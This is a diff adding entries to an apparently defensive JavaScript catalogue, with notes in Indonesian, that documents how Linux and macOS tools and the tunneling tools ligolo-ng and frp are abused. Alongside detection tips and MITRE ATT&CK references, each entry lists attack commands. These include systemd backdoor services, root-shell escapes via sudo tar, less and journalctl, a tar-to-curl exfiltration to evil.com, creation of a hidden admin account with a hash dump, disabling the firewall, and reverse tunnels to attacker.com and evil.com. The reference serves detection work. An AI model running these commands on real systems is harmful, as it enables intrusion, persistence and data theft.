+    tldr:"systemd service manager — create service baru = persistence. Kalau attacker punya sudo systemctl, bisa create malicious service yang run sebagai root. systemctl enable + start = persistent backdoor yang survive reboot. Timer units = cron alternative yang lebih stealthy karena lebih sedikit yang monitoring.",
+    abuse:"Create malicious systemd service untuk persistence, priv esc via sudo systemctl.",
+    red:{
+      desc:"Persistent backdoor via systemd service atau timer — survive reboot, optional SYSTEM-level exec.",
+      cmds:[
+        {c:"systemctl enable --now evil.service", n:"enable + start service — persistent mulai sekarang dan survive reboot"},
+        {c:"echo '[Unit]\\n[Service]\\nExecStart=/tmp/backdoor.sh\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/evil.service && systemctl daemon-reload && systemctl enable --now evil.service", n:"create + register + enable service backdoor"},
+        {c:"sudo systemctl edit --force --full cron.service", n:"edit existing service (cron) untuk tambah ExecStartPre malicious command"},
+        {c:"systemctl --user enable --now ~/.config/systemd/user/evil.service", n:"user-level service (tidak butuh root) — persist per user"},
+        {c:"systemctl list-unit-files | grep enabled", n:"list semua enabled services — recon untuk identify services attacker bisa modify"},
+      ]
+    },
+    legit:"Service management, system administration.",
+    tips:["Cek /etc/systemd/system/ untuk service files baru","Cek ~/.config/systemd/user/ (user-level services)","Cek service ExecStart — path suspicious?","Cek new enabled services setelah compromise","Cek systemctl daemon-reload (sinyal service baru)","Monitor /run/systemd/units/ untuk transient units"],
+    detect:"Alert new systemd service files di /etc/systemd/system. Alert daemon-reload setelah service creation.",
+    ref:["https://attack.mitre.org/techniques/T1543/002/"] },
+
+  { n:"tar", c:"lolbin", os:"linux", p:"/usr/bin/tar",
+    d:"Archive utility", r:"LOW",
+    m:["T1548.001","T1074.001"], mn:["SUID and SGID","Local Data Staging"], t:["Privilege Escalation","Collection"],
+    tldr:"Archive tool yang ada di semua Linux — biasanya sangat benign. Dua concerns: (1) GTFOBins via --checkpoint-action=exec= bisa spawn arbitrary commands, (2) staging data untuk exfil via tar + compress + send. Yang paling explosive: sudo tar dengan --checkpoint = instant root.",
+    abuse:"Shell escape via --checkpoint-action, data staging/exfil, priv esc via sudo tar.",
+    red:{
+      desc:"GTFOBins via checkpoint action, data staging untuk exfil.",
+      cmds:[
+        {c:"tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", n:"GTFOBins shell escape via checkpoint action"},
+        {c:"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", n:"priv esc via sudo tar — spawn root shell"},
+        {c:"tar czf /tmp/loot.tar.gz /etc/passwd /etc/shadow /home/*/.ssh/", n:"archive sensitive files untuk exfil"},
+        {c:"tar czf - /var/www/html | curl -s -X POST http://evil.com/exfil --data-binary @-", n:"archive + stream exfil langsung tanpa tulis file"},
+      ]
+    },
+    legit:"File archiving, backup.",
+    tips:["Cek --checkpoint-action flag","Cek sudo tar","Cek apa yang di-archive — sensitive files?","Cek output destination — remote?","Standalone sangat normal, cek konteks"],
+    detect:"Alert sudo tar dengan --checkpoint. Alert tar + sensitive paths (shadow, passwd, .ssh).",
+    ref:["https://gtfobins.github.io/gtfobins/tar/","https://attack.mitre.org/techniques/T1548/001/"] },
+
+  { n:"less", c:"lolbin", os:"linux", p:"/usr/bin/less",
+    d:"Pager for viewing file content", r:"LOW",
+    m:["T1059.004","T1548.001"], mn:["Unix Shell","SUID and SGID"], t:["Execution","Privilege Escalation"],
+    tldr:"File pager yang ada di mana-mana — GTFOBins klasik: '!bash' dari dalam less = instant shell. Kalau ada di sudoers atau punya SUID, itu priv esc instant. Sering dipakai untuk read sensitive files sebagai root (sudo less /etc/shadow) lalu escape ke root shell.",
+    abuse:"Shell escape dari interactive mode, priv esc via sudo less, SUID abuse.",
+    red:{
+      desc:"Shell escape dari pager mode, privilege escalation via sudo less.",
+      cmds:[
+        {c:"sudo less /etc/passwd", n:"read file sebagai root — dari dalam less, ketik '!bash' untuk root shell"},
+        {c:"less /etc/passwd; !/bin/bash", n:"GTFOBins — dari interactive less session"},
+        {c:"sudo less /dev/null", n:"open less dengan empty file — langsung escape ke root"},
+        {c:"VISUAL=\"/bin/bash\" less /etc/passwd", n:"set VISUAL env var untuk escape saat 'v' ditekan di less"},
+      ]
+    },
+    legit:"File viewing.",
+    tips:["Cek sudo less — ada di sudoers?","Cek SUID bit: ls -la /usr/bin/less","Monitor less spawning child processes","Key escape: '!command' dari dalam less = shell exec"],
+    detect:"Alert sudo less. Alert SUID less execution. Monitor less spawning bash/sh.",
+    ref:["https://gtfobins.github.io/gtfobins/less/","https://attack.mitre.org/techniques/T1059/004/"] },
+
+  { n:"journalctl", c:"lolbin", os:"linux", p:"/usr/bin/journalctl",
+    d:"Query systemd journal logs", r:"LOW",
+    m:["T1059.004","T1548.001"], mn:["Unix Shell","SUID and SGID"], t:["Execution","Privilege Escalation"],
+    tldr:"systemd log viewer — GTFOBins via '!bash' di dalamnya (kalau output lebih dari satu halaman, pager aktif). Yang classic: sudo journalctl karena sysadmin sering punya ini di sudoers untuk debug tanpa full root. Dari situ, '!bash' = root shell. Also: attacker pakai ini read logs sebelum wipe.",
+    abuse:"Shell escape dari pager mode, priv esc via sudo journalctl, log reconnaissance sebelum wipe.",
+    red:{
+      desc:"Priv esc via sudo journalctl + pager escape, read logs untuk forensic counter-intelligence.",
+      cmds:[
+        {c:"sudo journalctl", n:"open journal sebagai root — jika output > satu screen, pager aktif → '!bash' = root shell"},
+        {c:"sudo journalctl -u ssh.service", n:"read SSH logs sebagai root — recon lateral movement history"},
+        {c:"journalctl --since '1 hour ago' | grep -i 'fail\\|error\\|auth'", n:"recon auth failures — cek sebelum hapus logs"},
+        {c:"journalctl -p err -n 50", n:"50 recent errors — quick system state recon"},
+      ]
+    },
+    legit:"System log analysis, troubleshooting.",
+    tips:["Cek sudo journalctl — di sudoers?","Monitor journalctl spawning child processes (escape indicator)","Cek output redirect ke file (log staging)","Cek sebelum log clearing event"],
+    detect:"Alert sudo journalctl dengan child process spawn. Monitor journalctl dalam post-exploitation chain.",
+    ref:["https://gtfobins.github.io/gtfobins/journalctl/","https://attack.mitre.org/techniques/T1059/004/"] },
+
+  // ┌──────────────────────────────────────────────┐
+  // │        macOS — EXTRA                          │
+  // └──────────────────────────────────────────────┘
+  { n:"dscl", c:"system", os:"macos", p:"/usr/bin/dscl",
+    d:"Directory Services command line utility", r:"HIGH",
+    m:["T1136.001","T1087.001","T1531"], mn:["Create Account: Local Account","Account Discovery: Local Account","Account Access Removal"], t:["Persistence","Discovery","Impact"],
+    tldr:"macOS Directory Services CLI — equiv dari net user + net localgroup di Windows. 'dscl . create /Users/backdoor' = buat user baru silently. Kalau admin user dibuat tanpa interaksi GUI, hampir pasti suspicious. Juga bisa dipakai untuk enumerate users dan groups untuk recon.",
+    abuse:"Create backdoor admin accounts, enumerate users/groups, modify account permissions.",
+    red:{
+      desc:"User management dan manipulation untuk persistence atau privilege escalation di macOS.",
+      cmds:[
+        {c:"sudo dscl . create /Users/backdoor", n:"buat user baru bernama backdoor"},
+        {c:"sudo dscl . create /Users/backdoor UniqueID 505", n:"set UID untuk user baru"},
+        {c:"sudo dscl . append /Groups/admin GroupMembership backdoor", n:"tambah backdoor user ke admin group — priv esc"},
+        {c:"sudo dscl . passwd /Users/backdoor 'Password123'", n:"set password untuk backdoor user"},
+        {c:"dscl . list /Users | grep -v '^_'", n:"list semua user accounts — recon"},
+        {c:"dscl . read /Users/admin ShadowHashData | xxd | awk '{print $2$3}' | head -1", n:"dump password hash dari account — credential harvest"},
+      ]
+    },
+    legit:"macOS user/directory administration.",
+    tips:["Cek create /Users/ command — user baru?","Cek tambah ke admin/wheel group","Cek parent process","Monitor new user creation di macOS Security logs","Event: com.apple.OpenDirectory atau audit logs","Cek home directory dibuat di unusual path"],
+    detect:"Alert dscl create /Users. Alert dscl append /Groups/admin. Monitor macOS audit logs.",
+    ref:["https://attack.mitre.org/techniques/T1136/001/"] },
+
+  { n:"defaults", c:"system", os:"macos", p:"/usr/bin/defaults",
+    d:"macOS preferences database tool", r:"MEDIUM",
+    m:["T1547.011","T1564.001"], mn:["Plist Modification","Hidden Files and Directories"], t:["Persistence","Defense Evasion"],
+    tldr:"Baca/tulis macOS preferences dari command line — equiv dari registry editor tapi untuk macOS plist. Attacker pakai untuk modify startup settings, hide files, disable security features via preferences, atau tambah custom Login Items. 'defaults write com.apple.loginwindow' adalah persistence target classic.",
+    abuse:"Modify startup preferences, disable security notifications, add malicious login items.",
+    red:{
+      desc:"Manipulate macOS preferences untuk persistence atau disable security controls.",
+      cmds:[
+        {c:"defaults write com.apple.loginwindow LoginHook /tmp/backdoor.sh", n:"Login Hook persistence — exec script saat setiap user login (deprecated tapi masih kerja)"},
+        {c:"defaults write com.apple.Finder AppleShowAllFiles -bool true", n:"show hidden files — recon/discovery (harmless tapi ada di recon phase)"},
+        {c:"defaults write com.apple.screensaver askForPassword -int 0", n:"disable screensaver password — facilitate access"},
+        {c:"defaults write /Library/Preferences/com.apple.alf globalstate -int 0", n:"disable Application Firewall (ALF) — expose ports"},
+        {c:"defaults read com.apple.loginwindow", n:"read loginwindow prefs — check persistence entries"},
+      ]
+    },
+    legit:"macOS system configuration, app preferences.",
+    tips:["Cek write ke loginwindow prefs","Cek LoginHook modification","Cek firewall disable command","Cek parent process","Monitor /Library/Preferences/ writes"],
+    detect:"Alert defaults write loginwindow LoginHook. Alert disable firewall via defaults.",
+    ref:["https://attack.mitre.org/techniques/T1547/011/"] },
+
+  // ┌──────────────────────────────────────────────┐
+  // │        TUNNELING — EXTRA                      │
+  // └──────────────────────────────────────────────┘
+  { n:"ligolo-ng", c:"tunnel", os:"cross", p:"/usr/local/bin/ligolo-ng (linux) / ligolo-ng.exe (win)",
+    d:"Advanced tunneling tool via TLS reverse tunnel", r:"CRITICAL",
+    m:["T1572","T1090"], mn:["Protocol Tunneling","Proxy"], t:["Command and Control"],
+    tldr:"Modern tunneling tool yang lebih advanced dari chisel — create TLS-encrypted reverse tunnel yang tampak legit, support multiple sessions, dan routing full network. Increasingly popular di red team operations karena stealthy dan reliable. ANY presence di non-pentesting environment = immediate incident.",
+    chain:{ stage:"Command and Control / Lateral Movement", flows:["ligolo proxy (attacker) → ligolo agent (victim) → full network routing → access internal resources"] },
+    abuse:"Full network routing tunnel via TLS, SOCKS proxy, bypass network segmentation.",
+    red:{
+      desc:"Establish stealthy TLS reverse tunnel untuk full internal network access dari external.",
+      cmds:[
+        {c:"./proxy -selfcert -laddr 0.0.0.0:11601", n:"start proxy server di attacker side (port 11601) dengan self-signed cert"},
+        {c:"./agent -connect attacker.com:11601 -ignore-cert", n:"connect agent dari victim ke proxy — establish tunnel"},
+        {c:"# dari proxy console: session → start → add route 192.168.1.0/24 → start tuntap", n:"setup routing — setelah tunnel up, akses internal subnet langsung"},
+        {c:"./agent -connect attacker.com:443 -ignore-cert", n:"via port 443 — blend in dengan HTTPS traffic"},
+      ]
+    },
+    legit:"Tidak ada di enterprise. Red team/lab use only.",
+    tips:["Alert binary presence (ligolo, agent, proxy)","Cek network connections ke unusual IPs via TLS port non-443","Cek tun interface baru di system (ifconfig/ip addr)","Cek DNS resolution mencurigakan","Block known ligolo infrastructure","Immediate isolate jika ditemukan"],
+    detect:"Alert ligolo binary. Monitor tun interface creation. Alert TLS connections ke unusual endpoints.",
+    ref:["https://attack.mitre.org/techniques/T1572/"] },
+
+  { n:"frp", c:"tunnel", os:"cross", p:"/usr/local/bin/frpc | frps / frpc.exe | frps.exe",
+    d:"Fast Reverse Proxy", r:"CRITICAL",
+    m:["T1572","T1090.002"], mn:["Protocol Tunneling","External Proxy"], t:["Command and Control"],
+    tldr:"Open-source reverse proxy yang sangat populer di threat actors Asia-Pacific — bisa expose internal services (RDP, SSH, SMB) ke internet via frp server yang attacker kontrol. Config file (frpc.ini/frpc.toml) berisi server address dan port mapping. Kalau frpc ditemukan, extract config untuk tahu ke mana traffic di-route.",
+    abuse:"Expose internal RDP/SSH/SMB ke internet via reverse proxy, bypass NAT/firewall.",
+    red:{
+      desc:"Expose internal services ke attacker-controlled server via encrypted reverse proxy.",
+      cmds:[
+        {c:"frpc -c frpc.ini", n:"start frp client dengan config file — connect ke server + expose configured ports"},
+        {c:"# frpc.ini content:\n[common]\nserver_addr = evil.com\nserver_port = 7000\n[rdp]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 3389\nremote_port = 33890", n:"expose RDP (3389) ke port 33890 di server attacker"},
+        {c:"frpc -c frpc.toml", n:"versi config TOML (lebih baru)"},
+        {c:"nohup frpc -c frpc.ini > /dev/null 2>&1 &", n:"daemonize frpc — persistent tunnel yang survive logout"},
+      ]
+    },
+    legit:"Development/lab use. Enterprise = almost always suspicious.",
+    tips:["Detect frpc/frps binary presence","Cek config file frpc.ini/frpc.toml — server address?","Cek network connections ke unusual port (7000 default)","Cek /proc/<pid>/fd untuk open connections","Alert outbound connections ke non-standard ports dari internal host","Cek apakah dijalankan sebagai service/daemon"],
+    detect:"Alert frpc binary. Alert outbound TCP ke port 7000/7001. Monitor reverse proxy patterns.",
+    ref:["https://attack.mitre.org/techniques/T1572/"] },
 
 ];
 
